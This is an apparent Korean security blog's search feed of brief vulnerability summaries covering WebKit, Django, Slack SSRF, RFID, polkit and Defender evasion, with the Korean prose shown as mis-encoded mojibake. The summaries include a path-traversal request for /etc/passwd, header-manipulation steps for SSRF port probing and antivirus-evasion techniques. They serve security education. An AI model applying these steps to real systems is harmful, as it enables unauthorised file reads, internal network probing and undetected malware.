<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21779: Webkit Webcore use-after-free</title>
    <link href="/2021/06/12/fabu1ous/2021-06-12/"/>
    <url>/2021/06/12/fabu1ous/2021-06-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1238">Webkit WebCore::GraphicsContext use-after-free vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>WebKitGTK 2.30.4</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>WebkitGTK 2.30.4ì˜ GraphicsContextëŠ” íŠ¹ì • ì´ë²¤íŠ¸ë¥¼ í•¸ë“¤ í•  ë•Œ use-after-free ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. Webkitì€ ì˜¤í”ˆì†ŒìŠ¤ ì›¹ ì½˜í…ì¸  ì—”ì§„ìœ¼ë¡œ ë¸Œë¼ìš°ì €ë¥¼ ë¹„ë¡¯í•œ ì—¬ëŸ¬ ì‘ìš©í”„ë¡œê·¸ë¨ì—ì„œ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>Webkitì˜ <code>fillText()</code> í•¨ìˆ˜ëŠ” HTMLCanvasElement ë‚´ë¶€ íŠ¹ì • ì¢Œí‘œì— ë¬¸ìì—´ì„ ì¶œë ¥í•©ë‹ˆë‹¤. HTMLCanvasElementëŠ” <code>m_width</code>ì™€ <code>m_height</code>ê°’ì„ ê°–ê³  ìˆëŠ”ë° ì´ì— ë§ì¶° <code>fillText()</code> í•¨ìˆ˜ê°€ ì¶œë ¥í•  ë¬¸ìì—´ì˜ ì¢Œí‘œê°€ ìœ íš¨í•œ ë²”ìœ„ ë‚´ì— ìˆëŠ”ì§€ ê²€ì‚¬í•©ë‹ˆë‹¤.</p><p>HTMLCanvasElementëŠ” ë°±ê·¸ë¼ìš´ë“œì—ì„œ ìˆ˜í–‰ëœ ë³€ê²½ ì‚¬í•­ì— ë”°ë¼ <code>m_height</code> ê°’ì„ ì—…ë°ì´íŠ¸í•˜ì§€ë§Œ ì—…ë°ì´íŠ¸ë˜ê¸° ì´ì „ì˜ <code>m_height</code>ê°’ì„ ì‚¬ìš©í•´ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. ë˜í•œ <code>fillGradient()</code> í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©´ ì—…ë°ì´íŠ¸ë˜ê¸° ì´ì „ì˜ ê°’ì„ ì‚¬ìš©í•´ í• ë‹¹ í•´ì œëœ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•©ë‹ˆë‹¤.</p><p>ìœ„ ì·¨ì•½ì ì„ ì•…ìš©í•œ ì›¹ì‚¬ì´íŠ¸ì— ì ‘ì†í•  ê²½ìš° information leak ë° ì¶”ê°€ memory corruptionì— ì˜í•œ í”¼í•´ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>use after free</tag>
      
      <tag>uaf</tag>
      
      <tag>webkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-33203: Django path traversal vulnerability</title>
    <link href="/2021/06/11/l0ch/2021-06-11/"/>
    <url>/2021/06/11/l0ch/2021-06-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>íŒŒì´ì¬ìœ¼ë¡œ ì‘ì„±ëœ ì˜¤í”ˆì†ŒìŠ¤ ì›¹ í”„ë ˆì„ì›Œí¬ Djangoì—ì„œëŠ”  <code>django.contrib.admindocs</code> ëª¨ë“ˆì´ í™œì„±í™”ë˜ì—ˆì„ ë•Œ path traversal ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> í•¨ìˆ˜ì—ì„œ í•´ì»¤ëŠ” template ë³€ìˆ˜ë¥¼ ì„ì˜ì˜ ê°’ìœ¼ë¡œ ì„¤ì •í•  ìˆ˜ ìˆê³  ì´ë¥¼ ë³„ë‹¤ë¥¸ ê²€ì¦ ì—†ì´ Path joiní•©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ template directory ì™¸ë¶€ ê²½ë¡œì˜ íŒŒì¼ì„ ì œê³µí•  ìˆ˜ ìˆì–´ <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code> ì™€ ê°™ì´ ìš”ì²­ì„ ë³´ë‚´ëŠ” ê²ƒìœ¼ë¡œ íŒŒì¼ ì‹œìŠ¤í…œ ë‚´ ì„ì˜ ê²½ë¡œì˜ íŒŒì¼ ë‚´ìš©ì´ ë Œë”ë§ ë©”ì„œë“œë¡œ ì „ë‹¬ë˜ì–´ íŒŒì¼ ë‚´ìš©ì´ ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ ì•„ë˜ì™€ ê°™ì´ <code>safe_join</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ê²½ë¡œë¥¼ í•©ì¹˜ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>ìì„¸í•œ íŒ¨ì¹˜ íˆìŠ¤í† ë¦¬ëŠ” <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
      <tag>django</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] í—¤ë” ìˆ˜ì •ì„ í†µí•œ Slack infra metadata ìœ ì¶œ</title>
    <link href="/2021/06/10/idioth/2021-06-10/"/>
    <url>/2021/06/10/idioth/2021-06-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/727330">Header modification results in disclosure of Slack infra metadata to unauthorized parties</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Slack</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í´ë¼ìš°ë“œ ê¸°ë°˜ íŒ€ í˜‘ì—… ë„êµ¬ Slackì˜ <em>files.slack.com</em> ë„ë©”ì¸ì—ì„œ í˜¸ìŠ¤íŠ¸ í—¤ë” ëŒ€ì‹  <code>X-Forwarded-Host</code> í—¤ë”ë¥¼ ì‚¬ìš©í•˜ì—¬ infra metadataë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í˜¸ìŠ¤íŠ¸ê°€ <em>files.slack.com</em>ì´ ì•„ë‹ ë•Œ, í•´ë‹¹ URLì€ 500 Internal server errorë¥¼ ë°˜í™˜í•˜ëŠ” ìœ íš¨ì„± ê²€ì‚¬ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ í˜¸ìŠ¤íŠ¸ ì´ë¦„ì˜ ë ë¶€ë¶„ì— â€˜@â€™ë¥¼ ì¶”ê°€í•˜ì—¬ í•´ë‹¹ ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ í•´ë‹¹ requestëŠ” í”„ë¡ íŠ¸ ì—”ë“œê°€ ì•„ë‹Œ ë°± ì—”ë“œë¡œ ì „ë‹¬ë˜ì–´ Blind SSRF ì·¨ì•½ì ì´ ì¡´ì¬í•˜ë©´ ì¸íŠ¸ë¼ë„·ì— arbitrary requestë¥¼ ì „ì†¡í•˜ì—¬ ì‘ë‹µ ì‹œê°„ì„ í†µí•´ ë‹¤ì–‘í•œ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ë¥¼ í†µí•´ ì¸íŠ¸ë¼ë„·ì— ì—´ë ¤ìˆëŠ” í¬íŠ¸ë¥¼ í™•ì¸í•˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><p>ìŠ¬ë™ì— íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  â€œOpen originalâ€ì„ í†µí•´ ì›ë³¸ ì´ë¯¸ì§€ ê²½ë¡œë¥¼ ì°¾ì•„ burp suiteë¡œ ê°€ì ¸ì˜µë‹ˆë‹¤.</p></li><li><p>repeaterë¡œ ì „ì†¡í•˜ê³  í´ë¦­í•˜ì—¬ ì •ìƒì ìœ¼ë¡œ ì ‘ê·¼ë˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p></li><li><p><code>X-Forwarded-Host: xxx.com</code>ì„ í—¤ë”ì— ì¶”ê°€í•˜ì—¬ 500 errorê°€ ë°œìƒí•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p></li><li><p><code>X-Forwarded-Host: file.slack.com@YOUR_DOMAIN</code>ìœ¼ë¡œ í—¤ë”ë¥¼ ìˆ˜ì •í•˜ê³  302 responseê°€ ì˜¤ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ê²½ë¡œëŠ” <code>YOUR_DOMAIN/files-pri/...</code>ë¡œ ì§€ì •í•©ë‹ˆë‹¤.</p></li><li><p>ë„ë©”ì¸ì— requestê°€ ì „ì†¡ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ê³  ë„ë©”ì¸ì„ ì¸íŠ¸ë¼ë„· IPë¡œ ë³€ê²½í•©ë‹ˆë‹¤. í¬íŠ¸ë¥¼ ë°”ê¿”ê°€ë©° ì‘ë‹µ ì‹œê°„ì„ í™•ì¸í•©ë‹ˆë‹¤.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>information disclosure</tag>
      
      <tag>idioth</tag>
      
      <tag>slack</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-33881: RFID tear off attack, bypass monotonic counter</title>
    <link href="/2021/06/09/fabu1ous/2021-06-09/"/>
    <url>/2021/06/09/fabu1ous/2021-06-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html#eeprom-tear2">RFID: Monotoic Counter Anti-Tearing Defeated</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MIFARE Ultralight EV1, MF0UL</p><p>MIFARE Ultralight C, MF0ICU</p><p>MIFARE Ultralight NANO, MF0UN</p><p>NT2L1, NT2H10, NT2H12</p><p>N2H13, NT2H15, NT2H16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NXP MIFARE Ultralightì™€ NTAG ì¹´ë“œëŠ” replay ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•œ Monotonic Counter ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ëŠ”ë° í•´ë‹¹ ê¸°ëŠ¥ì„ tear off ê³µê²©ì„ í†µí•´ ë¬´ë ¥í™”í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Tear off ê³µê²©ì´ë€ RFID íƒœê·¸ì™€ ë¦¬ë” ì‚¬ì´ ë°ì´í„° í†µì‹ ì´ ì´ë£¨ì–´ì§€ëŠ” ë„ì¤‘ì— í†µì‹ ì„ ëŠì–´ë²„ë¦¬ëŠ” ê³µê²© ë°©ì‹ìœ¼ë¡œ EEPROMì´ ì“°ê¸° ì‘ì—…ì„ í•˜ëŠ” ë™ì•ˆ RFID íƒœê·¸ì˜ ë°ì´í„°ê°€ ì¼ê´€ë˜ì§€ ì•Šì€ ìƒíƒœë¡œ ìœ ì§€ë˜ì–´ ë²„ê·¸ê°€ ë°œìƒí•˜ë„ë¡ ìœ ë„í•©ë‹ˆë‹¤.</p><p>MIFARE Ultralight EV1ì€ 24-bit Monotonic Counterë¥¼ ì‚¬ìš©í•˜ê³  ì´ì™€ ê´€ë ¨ëœ ì»¤ë©˜ë“œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><ol><li><code>INCR_CNT</code> : Counterë¥¼ ì¦ê°€ì‹œí‚¨ë‹¤.</li><li><code>READ_CNT</code> : í˜„íƒœ Counterì˜ ê°’ì„ ì½ëŠ”ë‹¤.</li><li><code>CHECK_TEARING_EVENT</code> : anti-tearing 8-bit flagë¥¼ ê²€ì¦í•œë‹¤.</li></ol><p><code>INCR_CNT</code>ë¥¼ í†µí•´ ìœ íš¨í•œ Counterì˜ ê°’ì„ ì¦ê°€ ì‹œí‚´ê³¼ ë™ì‹œì— tear off ê³µê²©ì„ ìˆ˜í–‰í•˜ë©´ Counterì— ëŒ€í•œ ì“°ê¸° ì‘ì—…ì— ì¸í„°ëŸ½íŠ¸ë¥¼ ê±¸ ìˆ˜ ìˆê³ , <code>READ_CNT</code>ê°€ ì´ì „ Counterì˜ ê°’ì„ ë¦¬í„´í•˜ë©´ì„œ <code>CHECK_TEARING_EVENT</code>ê°€ ì •ìƒì ì¸ ê²€ì¦ flagë¥¼ ë¦¬í„´í•˜ëŠ” ìƒí™©ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>bypass</tag>
      
      <tag>rfid</tag>
      
      <tag>monotonic counter</tag>
      
      <tag>tear off</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-3560: Ubuntu/Fedora ì¸ì¦ ê´€ë¦¬ í”„ë¡œê·¸ë¨ polkitì˜ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/06/08/l0ch/2021-06-08/"/>
    <url>/2021/06/08/l0ch/2021-06-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/180">CVE-2021-3560 polkit: local privilege escalation using polkit_system_bus_name_get_creds_sync()</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>polkit 0.113 ~ 0.118</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>polkitì€ Unix ê³„ì—´ OS(Ubuntu, Fedora ë“±ì˜ ë¦¬ëˆ…ìŠ¤ ë°°í¬íŒ)ì—ì„œ ì‹œìŠ¤í…œ ì „ë°˜ì˜ ì¸ì¦ì„ í†µì œí•˜ëŠ” í”„ë¡œê·¸ë¨ìœ¼ë¡œ, sudo ë“± ê¸°ì¡´ ì¸ì¦ ì‹œìŠ¤í…œê³¼ ë‹¬ë¦¬ ëŠìŠ¨í•œ ìˆ˜ì¤€ì˜ ì¸ì¦ì„ ìˆ˜í–‰í•´ ê¶Œí•œì´ ì—†ëŠ” í”„ë¡œì„¸ìŠ¤ê°€ ê¶Œí•œ ìˆëŠ” ê³„ì •ê³¼ ì»¤ë®¤ë‹ˆì¼€ì´ì…˜ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/06/08/l0ch/2021-06-08/1.png"></p><blockquote><p>ì¶œì²˜ : <a href="https://ko.wikipedia.org/wiki/%ED%8F%B4%ED%82%B7">ìœ„í‚¤ë°±ê³¼</a></p></blockquote><p>polkitì€  <code>polkit_system_bus_name_get_creds_sync()</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ê¶Œí•œì´ í•„ìš”í•œ ì‘ì—…ì„ ìš”ì²­í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì˜ uid ë° pidë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ëŠ” ìš”ì²­ í”„ë¡œì„¸ìŠ¤ì˜ ê³ ìœ í•œ bus nameì„ <a href="https://ko.wikipedia.org/wiki/D-Bus">D-bus</a>ì˜ <code>dbus-daemon</code>ì— ì „ì†¡í•´ ìš”ì²­ í”„ë¡œì„¸ìŠ¤ì˜ ê¶Œí•œì„ í™•ì¸í•˜ëŠ”ë°, ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì€ í•¨ìˆ˜ í˜¸ì¶œ ì§ì „ì— ìš”ì²­ í”„ë¡œì„¸ìŠ¤ì™€ <code>dbus-daemon</code>ì˜ ì—°ê²°ì´ ëŠì–´ì§ˆ ë•Œ ë°œìƒí•©ë‹ˆë‹¤. <code>dbus-daemon</code>ì€ ì—°ê²°ì´ ëŠì–´ì§„ í”„ë¡œì„¸ìŠ¤ì˜ bus nameì´ ìœ íš¨í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ error ì‘ë‹µì„ ë³´ë‚´ì§€ë§Œ <code>polkit_system_bus_name_get_creds_sync()</code> í•¨ìˆ˜ì—ì„œ ì´ë¥¼ í™•ì¸í•˜ì§€ ì•Šì•„ ì„±ê³µì ìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì™”ë‹¤ëŠ” ì˜ë¯¸ì˜ TRUEë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ì˜ í˜¸ì¶œì ì¼ë¶€ëŠ” ì¶”ê°€ì ì¸ ê²€ì¦ ì—†ì´ 0ìœ¼ë¡œ ì´ˆê¸°í™”ëœ <code>AsyncGetBusNameCredsData</code> êµ¬ì¡°ì²´ë¥¼ ì°¸ì¡°í•˜ê²Œ ë˜ì–´ ìš”ì²­ í”„ë¡œì„¸ìŠ¤ì˜ uidë¥¼ 0ìœ¼ë¡œ ìƒê°í•˜ê³  root í”„ë¡œì„¸ìŠ¤ê°€ ìš”ì²­í•œ ê²ƒìœ¼ë¡œ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ íŒ¨ì¹˜ ì •ë³´ëŠ” <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a">https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a</a>  ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>fedora</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ê°„ë‹¨í•œ Defender ìš°íšŒ ë°©ë²•</title>
    <link href="/2021/06/07/idioth/2021-06-07/"/>
    <url>/2021/06/07/idioth/2021-06-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/">How to bypass Defender in a few easy steps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ signature detection, heuristics detection, in memory detectionì„ í†µí•´ ì•…ì„±ì½”ë“œë¥¼ íƒì§€í•©ë‹ˆë‹¤.</p><p>signatureì˜ ê²½ìš° ì´ë¯¸ ì•Œë ¤ì§„ ì•…ì„±ì½”ë“œì˜ íŒŒì¼ ì „ì²´ì˜ í•´ì‰¬ ê°’ì´ë‚˜ ì•…ì„± í–‰ìœ„ë¥¼ í•˜ëŠ” ë¶€ë¶„ì˜ ì¼ë¶€ í•´ì‰¬ ê°’ê³¼ ë¹„êµí•˜ì—¬ ì•…ì„±ì½”ë“œë¥¼ íƒì§€í•©ë‹ˆë‹¤. heuristicsëŠ” signature íƒì§€ ë‹¤ìŒ ë‹¨ê³„ì—ì„œ ì§„í–‰ë˜ëŠ” ê²ƒìœ¼ë¡œ ì•…ì„±ì½”ë“œë¥¼ ì—ë®¬ë ˆì´íŒ…í•˜ì—¬ ì–´ì…ˆë¸”ë¦¬ë‚˜ ì½”ë“œë¥¼ ì‚´í´ë³´ê³  ì–´ë– í•œ í–‰ìœ„ë¥¼ í•˜ëŠ”ì§€ í™•ì¸í•˜ì—¬ ì•…ì„±ì½”ë“œë¥¼ íƒì§€í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ, ë””ìŠ¤í¬ì— íŒŒì¼ì´ ì—†ëŠ” fileless ì•…ì„±ì½”ë“œ(powershell, vba macro, reflection for c# assembly)ì˜ ê²½ìš° Microsoft DefenderëŠ” <a href="https://docs.microsoft.com/ko-kr/windows/win32/amsi/antimalware-scan-interface-portal">AMSI</a> ìŠ¤ìº”ì„ í†µí•´ ì•…ì„±ì½”ë“œë¥¼ íƒì§€í•©ë‹ˆë‹¤.</p><p>signature detectionì„ ìš°íšŒí•˜ê¸° ìœ„í•´ì„œëŠ” ì–´ë– í•œ ë¶€ë¶„ì„ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ê°€ ì•…ì„±ì½”ë“œë¡œ íŒë‹¨í–ˆëŠ”ì§€ ì•Œì•„ë‚´ì•¼ í•©ë‹ˆë‹¤. AntiScan.me, VirusTotalì—ì„œ <code>DefenderCheck</code>, <code>Find-AVSignature</code> ë“±ì„ í™œìš©í•˜ì—¬ íŒë‹¨í•˜ëŠ” ë¶€ë¶„ì„ ì°¾ì•„ë‚¸ í›„ í•´ë‹¹ ë¬¸ìì—´ì„ ë¦¬íŒ©í„°ë§í•˜ê±°ë‚˜ ì–´ì…ˆë¸”ë¦¬ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆì§€ë§Œ ê° ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ë§ˆë‹¤ ìˆ˜í–‰í•˜ê±°ë‚˜ íŒŒì¼ì´ ì†ìƒë  ê°€ëŠ¥ì„±ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ <a href="https://github.com/mkaring/ConfuserEx">ConfuserEx</a> ê°™ì€ ë„êµ¬ë¥¼ í†µí•´ ì½”ë“œë¥¼ ë‚œë…í™”í•˜ì—¬ signature detectionì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>C#ìœ¼ë¡œ ì‘ì„±ëœ ì•…ì„±ì½”ë“œì˜ ê²½ìš° <a href="https://github.com/Flangvik/NetLoader">NetLoader</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ heuristics detectionê³¼ in memory detectionì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. NetLoaderëŠ” C# ì–´ì…ˆë¸”ë¦¬ë¥¼ ê²½ë¡œ, URLì´ë‚˜ SM ê³µìœ ì—ì„œ reflectionì„ í†µí•´ ë¡œë“œí•©ë‹ˆë‹¤. ë””ìŠ¤í¬ì— ì•…ì„± íŒŒì¼ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ heuristics detectionì„ ìš°íšŒí•  ìˆ˜ ìˆê³  Microsoftì—ì„œ NetLoaderì— signatureë¥¼ ì¶”ê°€í•˜ì§€ ì•Šì•„ in memory detection ë˜í•œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>bypass</tag>
      
      <tag>defender</tag>
      
      <tag>signature</tag>
      
      <tag>heuristic</tag>
      
      <tag>antivirus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ì•…ì„±ì½”ë“œ ë¶„ì„ìš© VM ì„¸íŒ…ì„ ìë™í™”í•´ë³´ì!</title>
    <link href="/2021/06/06/idioth/setting_malware_vm/"/>
    <url>/2021/06/06/idioth/setting_malware_vm/</url>
    
    <content type="html"><![CDATA[<h1 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h1><p>ì•ˆë…•í•˜ì„¸ìš”. idiothì…ë‹ˆë‹¤. ì˜¤ëŠ˜ ê°€ì ¸ì˜¨ ì£¼ì œëŠ” â€œì•…ì„±ì½”ë“œ ë¶„ì„ìš© ê°€ìƒ ë¨¸ì‹  ì„¤ì • ìë™í™”â€ì…ë‹ˆë‹¤.</p><p>ë‹ê²ì€ ê·€ì°®ì€ í–‰ë™ì„ í•˜ê¸° ì‹«ì–´í•©ë‹ˆë‹¤.(ì €ë§Œ ê·¸ëŸ° ê±´ ì•„ë‹ˆê² ì£ ?) ë³´í†µ ì•…ì„±ì½”ë“œ ë¶„ì„ì€ ê°€ìƒ ë¨¸ì‹ ì—ì„œ ìˆ˜í–‰í•˜ê³ , ë˜ ë¶„ì„ìš© VMì„ ì—¬ëŸ¬ ê°œ ë“¤ê³  ìˆê±°ë‚˜ ì•„ë‹ˆë©´ ë‹¤ë¥¸ PCì— ì„¤ì¹˜í•´ì•¼ í•  ì¼ ë“±ì´ ìˆì£ . ì˜ˆë¥¼ ë“¤ì–´ ì € ê°™ì€ ê²½ìš°ëŠ” ì§‘ì— ìˆëŠ” ë°ìŠ¤í¬í†±ê³¼ í•™êµë‚˜ ì¹´í˜ ë“±ì—ì„œ ì‚¬ìš©í•˜ëŠ” ë…¸íŠ¸ë¶ìœ¼ë¡œ ë‚˜ë‰˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><p>Windows ê°€ìƒ ë¨¸ì‹ ì—ë‹¤ê°€ ì´ëŸ°ì €ëŸ° ë„êµ¬ë“¤ì„ ì„¤ì •í•˜ë©´ ìš©ëŸ‰ì´ ì»¤ì ¸ì„œ ì••ì¶•í•˜ê±°ë‚˜ ì˜®ê¸°ëŠ” ë°ì—ë„ ì‹œê°„ì´ ê½¤ ê±¸ë¦½ë‹ˆë‹¤. ë°–ì— ìˆëŠ”ë° ë…¸íŠ¸ë¶ì„ í¬ë§·í•˜ê±°ë‚˜ í•˜ëŠ” ìƒí™©ì´ ë°œìƒí•˜ë©´ Windows ê°€ìƒ ë¨¸ì‹ ì„ ìƒˆë¡œ ë§Œë“¤ì–´ì„œ ì„¤ì •ì„ ì­‰ í•´ì•¼ í•˜ì£ .</p><p>í¬ë„ˆë¸”ì„ ê³µë¶€í•  ë•Œ ì‚¬ìš©í•˜ëŠ” ìš°ë¶„íˆ¬ì—ì„œëŠ” ì œê°€ ì‚¬ìš©í•˜ëŠ” íˆ´ ë“±ì„ ì‰˜ ìŠ¤í¬ë¦½íŠ¸ë¡œ ë‹¤ìš´ë¡œë“œ ë° ì„¤ì •í•˜ê²Œ ë§Œë“¤ì–´ì„œ ë¦¬ëˆ…ìŠ¤ë¥¼ ì‚¬ìš©í•  ë•Œ ì‰˜ ìŠ¤í¬ë¦½íŠ¸ë§Œ ì‹¤í–‰í•˜ê³  ë”´ì§“ì„ í•˜ë‹¤ ì˜¤ë©´ ì„¸íŒ…ì´ ë‹¤ ë˜ëŠ”ë° Windowsë„ ê°€ëŠ¥í• ê¹Œ?ë¼ëŠ” ìƒê°ì—ì„œ ì‹œì‘í–ˆìŠµë‹ˆë‹¤.</p><p><a href="https://github.com/fireeye/flare-vm">FireEyeì—ì„œ ë°°í¬í•˜ëŠ” FlareVM</a>ë„ ì¡´ì¬í•˜ì§€ë§Œ ëª¨ë“  íˆ´ì„ ë‹¤ ë‹¤ìš´ë¡œë“œí•˜ê¸°ë„ í•˜ê³  ì˜¤ë˜ ê±¸ë¦¬ë©´ í•˜ë£¨ ì¢…ì¼ 